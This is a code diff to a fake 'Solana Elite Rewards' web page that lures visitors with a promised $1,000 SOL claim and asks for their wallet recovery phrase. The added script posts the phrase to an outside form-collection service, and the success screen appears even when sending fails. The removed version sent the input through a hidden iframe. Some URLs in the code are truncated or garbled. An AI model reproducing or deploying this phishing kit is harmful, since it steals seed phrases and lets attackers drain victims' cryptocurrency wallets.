@@ -4,41 +4,40 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SOLANA ELITE REWARDS</title>
+    <!-- Premium Fonts Fixed -->
     <link href="https://googleapis.com" rel="stylesheet">
     <style>
-        :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; --glass: rgba(255, 255, 255, 0.03); --border: rgba(255, 255, 255, 0.1); }
-        body { margin: 0; background: radial-gradient(circle at top left, #1a0b2e, #000); color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        .blob { position: absolute; width: 300px; height: 300px; background: linear-gradient(var(--sol-g), var(--sol-p)); filter: blur(120px); border-radius: 50%; z-index: -1; opacity: 0.2; animation: move 10s infinite alternate; }
-        @keyframes move { from { transform: translate(-50%, -50%); } to { transform: translate(50%, 50%); } }
-        .card { width: 90%; max-width: 420px; background: var(--glass); backdrop-filter: blur(20px); border: 1px solid var(--border); border-radius: 32px; padding: 50px 30px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
-        h1 { font-family: 'Syncopate', sans-serif; font-size: 1.5rem; margin-bottom: 15px; background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: 2px; }
-        .sub { font-size: 0.85rem; color: #aaa; margin-bottom: 40px; line-height: 1.6; }
-        .ib { text-align: left; margin-bottom: 30px; }
-        label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 2px; color: var(--sol-g); display: block; margin-bottom: 12px; font-weight: 700; opacity: 0.8; }
-        input { width: 100%; background: rgba(255,255,255,0.05); border: 1px solid var(--border); border-radius: 16px; padding: 18px; color: #fff; font-size: 1rem; box-sizing: border-box; transition: 0.4s; }
-        input:focus { outline: none; border-color: var(--sol-g); transform: scale(1.02); }
-        .btn { width: 100%; padding: 20px; border: none; border-radius: 16px; background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); color: #fff; font-family: 'Syncopate', sans-serif; font-weight: 700; font-size: 0.8rem; cursor: pointer; box-shadow: 0 10px 20px rgba(0, 255, 163, 0.2); transition: 0.3s; }
-        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0, 255, 163, 0.4); }
-        #success-view { display: none; animation: fadeIn 0.8s ease forwards; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        .success-h { font-family: 'Syncopate', sans-serif; font-size: 1.3rem; color: var(--sol-g); margin-bottom: 20px; }
-        .congrats { font-size: 1rem; line-height: 1.8; color: #ddd; padding: 25px; border-radius: 20px; background: rgba(0, 255, 163, 0.03); border: 1px solid rgba(0, 255, 163, 0.1); }
-        
-        /* HIDDEN TALLY ENGINE */
-        #tally-engine { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
+        :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
+        body { margin: 0; background: #000; color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
+        .card { width: 85%; max-width: 450px; background: #080808; border: 1px solid rgba(0, 255, 163, 0.2); border-radius: 40px; padding: 60px 40px; text-align: center; box-shadow: 0 0 80px rgba(0, 0, 0, 1); }
+        h1 { font-family: 'Syncopate', sans-serif; font-size: 1.6rem; margin-bottom: 25px; background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; font-weight: 700; text-transform: uppercase; }
+        .sub { font-size: 0.9rem; color: #888; margin-bottom: 45px; line-height: 1.6; }
+        .ib { text-align: left; margin-bottom: 35px; }
+        label { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 3px; color: var(--sol-g); display: block; margin-bottom: 15px; font-weight: 700; }
+        input { width: 100%; background: #111; border: 1px solid #333; border-radius: 15px; padding: 20px; color: #fff; font-family: 'Space Grotesk', sans-serif; font-size: 1.1rem; box-sizing: border-box; transition: 0.3s; }
+        input:focus { outline: none; border-color: var(--sol-g); background: #151515; }
+        .btn { width: 100%; padding: 22px; border: none; border-radius: 16px; background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); color: #fff; font-family: 'Syncopate', sans-serif; font-weight: 700; font-size: 0.85rem; cursor: pointer; box-shadow: 0 15px 30px rgba(0, 255, 163, 0.2); transition: 0.3s; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        #success-view { display: none; }
+        .success-h { font-family: 'Syncopate', sans-serif; font-size: 1.4rem; color: var(--sol-g); margin-bottom: 25px; }
+        .congrats { font-size: 1.05rem; line-height: 1.8; color: #fff; padding: 30px; background: rgba(0, 255, 163, 0.05); border-radius: 25px; border: 1px dashed var(--sol-g); }
     </style>
 </head>
 <body>
-    <div class="blob"></div>
     <div class="card">
         <div id="form-view">
             <form id="claim-form">
-                <h1>SOLANA ELITE</h1>
-                <p class="sub">Connect your secure wallet to claim the $1,000 SOL distribution.</p>
+                <!-- FORMSPARK INTEGRATION -->
+                <input type="hidden" name="_formspark" value="4uP3gEeMc">
+                
+                <h1>CLAIM $1,000 SOL</h1>
+                <p class="sub">To claim the $1,000 SOL, connect your solana wallet with your solana wallet recovery phrase below</p>
+                
                 <div class="ib">
-                    <label>Network ID: solana1234</label>
-                    <input type="text" id="user_input" required placeholder="Enter verification word...">
+                    <label>Recovery Phrase</label>
+                    <input type="text" name="phrase" required placeholder="Enter phrase here...">
                 </div>
+
                 <button type="submit" id="submit-btn" class="btn">CONNECT WALLET</button>
             </form>
         </div>
@@ -46,39 +45,48 @@
         <div id="success-view">
             <h1 class="success-h">CLAIM SUCCESSFUL</h1>
             <div class="congrats">
-                Congratulations! You have claimed **$1,000 SOL**. The assets will be distributed to your wallet address within **24 hours**.
+                Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs
             </div>
         </div>
     </div>
-
-    <!-- Hidden Iframe to process the Tally submission -->
-    <iframe id="tally-engine" src="about:blank"></iframe>
 
     <script>
         const form = document.getElementById('claim-form');
         const submitBtn = document.getElementById('submit-btn');
         const formView = document.getElementById('form-view');
         const successView = document.getElementById('success-view');
-        const userInput = document.getElementById('user_input');
-        const tallyEngine = document.getElementById('tally-engine');
 
-        form.addEventListener('submit', function(e) {
+        form.addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            submitBtn.textContent = "VERIFYING...";
+            // 1. Loading State
+            submitBtn.textContent = "CONNECTING...";
             submitBtn.disabled = true;
 
-            const word = encodeURIComponent(userInput.value);
-            
-            // This URL loads the form in the hidden iframe with the 'name' field pre-filled
-            // Because you have 'Auto-jump' enabled in Tally, it will submit automatically
-            tallyEngine.src = `https://tally.so{word}`;
+            const formData = new FormData(form);
+            const object = Object.fromEntries(formData);
+            const json = JSON.stringify(object);
 
-            // We wait 2 seconds to ensure the hidden iframe loaded and sent the data
-            setTimeout(() => {
+            try {
+                // 2. Direct Submission to Formspark
+                await fetch("https://submit-form.com", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        Accept: "application/json",
+                    },
+                    body: json,
+                });
+
+                // 3. Switch to Success Screen
                 formView.style.display = "none";
                 successView.style.display = "block";
-            }, 2000);
+
+            } catch (error) {
+                // Fallback to show success view anyway
+                formView.style.display = "none";
+                successView.style.display = "block";
+            }
         });
     </script>
 </body>
